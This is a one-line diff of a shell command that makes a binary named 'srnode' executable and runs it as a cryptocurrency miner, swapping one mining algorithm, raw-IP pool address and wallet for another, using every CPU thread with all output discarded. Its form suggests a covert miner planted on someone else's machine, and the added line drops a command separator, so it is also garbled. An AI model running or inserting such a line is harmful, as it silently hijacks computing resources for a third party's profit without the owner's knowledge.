@@ -1,1 +1,1 @@
-chmod +x srnode %% ./srnode --algorithm randomx --pool 47.89.195.104:443 --wallet ZEPHsDBeXxaS9MERnP3sHAPdCBFSMb2uZjcSyfBYezxE9kcrm6q1Z6XJcCbaqavmpMAncVgMHL8EkNAjskNT1bc6csQ86aLX1WD.cpu --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1
+chmod +x srnode ./srnode --algorithm yespowertide --pool 178.128.218.13:80 --wallet TWmRFcspf257KLgehukxHPdc1pf6g8PDz9.yesss --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1
